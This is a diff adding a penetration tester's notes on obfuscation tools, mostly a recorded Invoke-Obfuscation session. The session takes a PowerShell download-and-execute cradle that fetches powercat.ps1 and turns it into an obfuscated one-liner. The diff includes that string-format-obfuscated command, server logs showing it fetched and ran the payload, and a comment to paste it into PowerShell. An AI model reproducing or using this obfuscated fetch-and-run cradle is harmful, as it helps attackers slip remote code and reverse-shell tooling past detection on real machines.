@@ -3,4 +3,38 @@ obscurification
 
 DKMC
 Invoke-obfuscation
+Veil(old)
 
+
+Invoke-Obfuscation>
+set scriptblock Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://127.0.0.1/powercat.ps1')
+Invoke-Obfuscation> test
+
+Invoking (though you haven't obfuscated anything yet):
+Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://127.0.0.1/powercat.ps1')
+
+127.0.0.1 - - [16/Nov/2019 22:46:01] "GET /powercat.ps1 HTTP/1.1" 200 -
+
+Invoke-Obfuscation> token
+Invoke-Obfuscation\Token> string
+Invoke-Obfuscation\Token\String> 2
+Invoke-Obfuscation\Token> command
+Invoke-Obfuscation\Token\Command> 3
+Invoke-Obfuscation\Token> argument
+Invoke-Obfuscation\Token\Argument> 4
+Invoke-Obfuscation\Token> all
+Invoke-Obfuscation\Token\All> 1
+Invoke-Obfuscation\Token\All> test
+Invoke-Obfuscation> encoding
+Invoke-Obfuscation\Encoding> 3
+Invoke-Obfuscation> test
+Invoke-Obfuscation\Compress> 1
+
+#can test in powershell various ways
+#Open powershell and run
+&("{3}{0}{2}{1}" -f 'p','n',("{0}{1}{2}" -f'res','si','o'),("{0}{1}" -f 'Invoke-E','x')) (&("{1}{2}{0}{3}" -f'bje','New','-O','ct') ("{0}{1}{2}{3}{5}{4}"-f'Sy',("{1}{0}" -f 'tem','s'),("{0}{1}" -f'.N','et.'),'Web','t',("{0}{1}"-f 'Cli','en'))).("{1}{0}{2}{3}" -f 'ownloadSt','D','rin','g').Invoke(("{7}{6}{0}{4}{5}{3}{1}{8}{2}"-f '7.0','at','s1',("{1}{0}" -f'erc','pow'),("{1}{0}" -f'0.1','.'),'/',("{2}{1}{0}" -f '2','//1','ttp:'),'h','.p'))
+
+127.0.0.1 - - [16/Nov/2019 23:07:53] "GET /powercat.ps1 HTTP/1.1" 200 -
+
+#Select a command (works in windows not in powershell on linux)
+Invoke-Obfuscation\Launcher>
